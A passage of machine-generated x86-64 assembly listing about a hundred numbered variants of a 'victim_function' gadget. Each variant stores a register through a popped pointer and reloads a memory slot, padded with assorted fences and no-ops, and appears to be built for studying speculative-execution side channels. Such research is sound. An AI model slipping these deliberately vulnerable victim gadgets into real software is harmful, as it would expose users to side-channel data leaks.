	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 155
.Lvictim_function_win0_var155:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 156
.Lvictim_function_win0_var156:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 157
.Lvictim_function_win0_var157:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 158
.Lvictim_function_win0_var158:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 159
.Lvictim_function_win0_var159:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 160
.Lvictim_function_win0_var160:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 161
.Lvictim_function_win0_var161:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 162
.Lvictim_function_win0_var162:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 163
.Lvictim_function_win0_var163:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 164
.Lvictim_function_win0_var164:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 165
.Lvictim_function_win0_var165:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 166
.Lvictim_function_win0_var166:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 167
.Lvictim_function_win0_var167:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 168
.Lvictim_function_win0_var168:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 169
.Lvictim_function_win0_var169:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 170
.Lvictim_function_win0_var170:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 171
.Lvictim_function_win0_var171:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 172
.Lvictim_function_win0_var172:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 173
.Lvictim_function_win0_var173:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 174
.Lvictim_function_win0_var174:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 175
.Lvictim_function_win0_var175:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 176
.Lvictim_function_win0_var176:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 177
.Lvictim_function_win0_var177:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 178
.Lvictim_function_win0_var178:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 179
.Lvictim_function_win0_var179:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 180
.Lvictim_function_win0_var180:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 181
.Lvictim_function_win0_var181:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 182
.Lvictim_function_win0_var182:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 183
.Lvictim_function_win0_var183:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 184
.Lvictim_function_win0_var184:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 185
.Lvictim_function_win0_var185:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 186
.Lvictim_function_win0_var186:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 187
.Lvictim_function_win0_var187:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 188
.Lvictim_function_win0_var188:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 189
.Lvictim_function_win0_var189:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 190
.Lvictim_function_win0_var190:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 191
.Lvictim_function_win0_var191:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 192
.Lvictim_function_win0_var192:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 193
.Lvictim_function_win0_var193:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 194
.Lvictim_function_win0_var194:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 195
.Lvictim_function_win0_var195:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 196
.Lvictim_function_win0_var196:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 197
.Lvictim_function_win0_var197:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 198
.Lvictim_function_win0_var198:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 199
.Lvictim_function_win0_var199:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 200
.Lvictim_function_win0_var200:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 201
.Lvictim_function_win0_var201:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 202
.Lvictim_function_win0_var202:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 203
.Lvictim_function_win0_var203:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 204
.Lvictim_function_win0_var204:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 205
.Lvictim_function_win0_var205:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 206
.Lvictim_function_win0_var206:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 207
.Lvictim_function_win0_var207:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 208
.Lvictim_function_win0_var208:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 209
.Lvictim_function_win0_var209:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 210
.Lvictim_function_win0_var210:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 211
.Lvictim_function_win0_var211:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 212
.Lvictim_function_win0_var212:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 213
.Lvictim_function_win0_var213:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 214
.Lvictim_function_win0_var214:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 215
.Lvictim_function_win0_var215:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 216
.Lvictim_function_win0_var216:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 217
.Lvictim_function_win0_var217:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 218
.Lvictim_function_win0_var218:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 219
.Lvictim_function_win0_var219:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 220
.Lvictim_function_win0_var220:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 221
.Lvictim_function_win0_var221:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 222
.Lvictim_function_win0_var222:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 223
.Lvictim_function_win0_var223:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 224
.Lvictim_function_win0_var224:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 225
.Lvictim_function_win0_var225:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 226
.Lvictim_function_win0_var226:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 227
.Lvictim_function_win0_var227:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 228
.Lvictim_function_win0_var228:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 229
.Lvictim_function_win0_var229:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 230
.Lvictim_function_win0_var230:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 231
.Lvictim_function_win0_var231:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 232
.Lvictim_function_win0_var232:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 233
.Lvictim_function_win0_var233:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 234
.Lvictim_function_win0_var234:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 235
.Lvictim_function_win0_var235:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 236
.Lvictim_function_win0_var236:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 237
.Lvictim_function_win0_var237:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 238
.Lvictim_function_win0_var238:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 239
.Lvictim_function_win0_var239:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 240
.Lvictim_function_win0_var240:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 241
.Lvictim_function_win0_var241:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 242
.Lvictim_function_win0_var242:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 243
.Lvictim_function_win0_var243:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 244
.Lvictim_function_win0_var244:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 245
.Lvictim_function_win0_var245:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 246
.Lvictim_function_win0_var246:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 247
.Lvictim_function_win0_var247:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 248
.Lvictim_function_win0_var248:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 249
.Lvictim_function_win0_var249:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 250
.Lvictim_function_win0_var250:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 251
.Lvictim_function_win0_var251:
	popq	%rax
	movq	%rcx, (%rax)
